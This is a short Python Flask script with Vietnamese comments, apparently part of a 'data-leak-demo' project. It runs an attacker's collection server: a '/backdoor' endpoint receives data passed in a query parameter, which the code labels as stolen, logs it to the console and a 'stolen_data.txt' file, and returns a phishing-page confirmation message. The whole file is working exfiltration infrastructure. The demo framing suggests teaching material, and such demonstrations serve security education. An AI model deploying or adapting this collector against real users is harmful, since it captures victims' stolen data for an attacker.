# data-leak-demo/website2.py
from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)

# End-point để nhận dữ liệu bị đánh cắp
@app.route('/backdoor', methods=['GET'])
def log_data():
    stolen_data = request.args.get('data')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = f"[{timestamp}] Dữ liệu nhận được: {stolen_data}\n"
    
    # In ra console để theo dõi trực tiếp
    print(log_entry)
    
    # Lưu vào tệp trong cùng thư mục
    log_file = os.path.join(os.path.dirname(__file__), 'stolen_data.txt')
    with open(log_file, "a") as f:
        f.write(log_entry)
        
    return "Trang lừa đảo đã được truy cập thành công."

if __name__ == '__main__':
    # Chạy trên một cổng khác (ví dụ: 8000)
    app.run(port=8000, debug=True)